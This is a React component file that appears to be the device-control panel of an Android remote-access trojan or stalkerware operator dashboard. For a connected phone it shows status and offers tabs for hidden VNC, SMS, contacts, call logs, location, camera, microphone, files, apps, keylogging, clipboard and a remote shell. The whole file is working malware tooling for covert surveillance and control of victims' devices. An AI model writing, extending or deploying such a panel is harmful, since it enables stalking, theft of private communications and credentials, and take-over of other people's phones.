import { useState } from 'react';
import { send } from '../lib/socket';
import HvncView from './HvncView';
import InfoTab from './tabs/InfoTab';
import SmsTab from './tabs/SmsTab';
import ContactsTab from './tabs/ContactsTab';
import CallLogsTab from './tabs/CallLogsTab';
import LocationTab from './tabs/LocationTab';
import CameraTab from './tabs/CameraTab';
import AudioTab from './tabs/AudioTab';
import FilesTab from './tabs/FilesTab';
import AppsTab from './tabs/AppsTab';
import KeylogTab from './tabs/KeylogTab';
import ShellTab from './tabs/ShellTab';
import ClipboardTab from './tabs/ClipboardTab';

const TABS = [
  { id: 'hvnc',     label: 'HVNC',      icon: '◈' },
  { id: 'info',     label: 'Info',       icon: 'ℹ' },
  { id: 'sms',      label: 'SMS',        icon: '✉' },
  { id: 'contacts', label: 'Contacts',   icon: '👤' },
  { id: 'calls',    label: 'Calls',      icon: '📞' },
  { id: 'location', label: 'Location',   icon: '📍' },
  { id: 'camera',   label: 'Camera',     icon: '📷' },
  { id: 'audio',    label: 'Mic',        icon: '🎙' },
  { id: 'files',    label: 'Files',      icon: '📁' },
  { id: 'apps',     label: 'Apps',       icon: '⬚' },
  { id: 'keylog',   label: 'Keylog',     icon: '⌨' },
  { id: 'clipboard',label: 'Clipboard',  icon: '📋' },
  { id: 'shell',    label: 'Shell',      icon: '$' },
];

export default function DevicePanel({ device, hvncHandlerRef, onSidebarOpen }) {
  const [tab, setTab] = useState('hvnc');

  const isHvnc = tab === 'hvnc';

  const tabProps = { device };

  return (
    <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minWidth: 0 }}>

      {/* Top bar */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '8px 14px', background: '#0f0f14', borderBottom: '1px solid #1e1e2a', flexShrink: 0 }}>
        {/* Mobile menu trigger */}
        <button onClick={onSidebarOpen} className="show-mobile"
          style={{ display: 'none', background: 'none', border: 'none', color: '#555', fontSize: 18, cursor: 'pointer', flexShrink: 0 }}>☰</button>

        <div style={{ width: 8, height: 8, borderRadius: '50%', background: device.online ? '#00d26a' : '#444', boxShadow: device.online ? '0 0 6px #00d26a' : 'none', flexShrink: 0 }} />
        <span style={{ fontSize: 13, fontWeight: 600, color: '#ddd', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
          {device.alias || device.model || device.id.slice(0, 16)}
        </span>
        <span style={{ fontSize: 11, color: '#444', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', flexShrink: 0 }}>
          {device.manufacturer} · Android {device.android_version || '?'} · {device.id.slice(0,8)}
        </span>
        {device.battery_level >= 0 && (
          <span style={{ marginLeft: 'auto', fontSize: 11, color: device.battery_level < 20 ? '#f44' : '#00d26a', flexShrink: 0 }}>
            ⚡{device.battery_level}%
          </span>
        )}
        <style>{`@media(max-width:768px){.show-mobile{display:block!important}}`}</style>
      </div>

      {/* Tab strip */}
      <div style={{ display: 'flex', overflowX: 'auto', background: '#0c0c12', borderBottom: '1px solid #1e1e2a', flexShrink: 0, scrollbarWidth: 'none' }}>
        {TABS.map(t => (
          <button key={t.id} onClick={() => setTab(t.id)}
            style={{
              padding: '9px 14px', background: 'none', border: 'none',
              borderBottom: `2px solid ${tab === t.id ? '#00d26a' : 'transparent'}`,
              color: tab === t.id ? '#00d26a' : '#555',
              fontSize: 12, cursor: 'pointer', whiteSpace: 'nowrap',
              transition: 'color .15s, border-color .15s',
              display: 'flex', alignItems: 'center', gap: 5, flexShrink: 0,
            }}>
            <span style={{ fontSize: 13 }}>{t.icon}</span>
            <span className="tab-label">{t.label}</span>
          </button>
        ))}
        <style>{`@media(max-width:480px){.tab-label{display:none}} `}</style>
      </div>

      {/* Content */}
      <div style={{ flex: 1, overflow: isHvnc ? 'hidden' : 'auto', display: 'flex', flexDirection: 'column' }}>
        {tab === 'hvnc'     && <HvncView device={device} hvncHandlerRef={hvncHandlerRef} />}

        {tab !== 'hvnc' && (
          <div style={{ padding: 16, flex: 1 }}>
            {tab === 'info'      && <InfoTab {...tabProps} />}
            {tab === 'sms'       && <SmsTab {...tabProps} />}
            {tab === 'contacts'  && <ContactsTab {...tabProps} />}
            {tab === 'calls'     && <CallLogsTab {...tabProps} />}
            {tab === 'location'  && <LocationTab {...tabProps} />}
            {tab === 'camera'    && <CameraTab {...tabProps} />}
            {tab === 'audio'     && <AudioTab {...tabProps} />}
            {tab === 'files'     && <FilesTab {...tabProps} />}
            {tab === 'apps'      && <AppsTab {...tabProps} />}
            {tab === 'keylog'    && <KeylogTab {...tabProps} />}
            {tab === 'clipboard' && <ClipboardTab {...tabProps} />}
            {tab === 'shell'     && <ShellTab {...tabProps} />}
          </div>
        )}
      </div>
    </div>
  );
}
